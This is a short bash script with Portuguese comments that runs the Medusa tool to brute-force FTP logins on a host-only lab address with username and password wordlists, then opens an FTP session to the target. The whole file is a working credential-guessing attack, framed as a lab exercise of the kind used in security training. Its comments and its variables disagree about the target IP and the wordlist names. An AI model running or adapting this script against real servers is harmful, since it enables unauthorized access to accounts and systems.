#!/usr/bin/env bash
# medusa_ftp.sh
# Força bruta em FTP com Medusa — ambiente de laboratório.
#
# Uso:
#   chmod +x medusa_ftp.sh
#   ./medusa_ftp.sh
#
# Comando usado:
#   medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6

set -euo pipefail

TARGET="192.168.56.102"
USERS="wordlists/usuariom.txt"
PASSWORDS="wordlists/senham.txt"
THREADS=6

echo "=== Força Bruta em FTP (Medusa) ==="
echo "Host: $TARGET | Usuários: $USERS | Senhas: $PASSWORDS | Threads: $THREADS"

if [ ! -f "$USERS" ]; then
  echo "ERRO: users.txt não encontrado"
  exit 1
fi
if [ ! -f "$PASSWORDS" ]; then
  echo "ERRO: pass.txt não encontrado"
  exit 1
fi

# Comando executado:
#   medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
echo "Executando Medusa..."
sudo medusa -h "$TARGET" -U "$USERS" -P "$PASSWORDS" -M ftp -t "$THREADS"

echo ""
echo "=== Conectividade FTP ==="
ftp 192.168.56.101

echo ""
echo "=== Finalização ==="
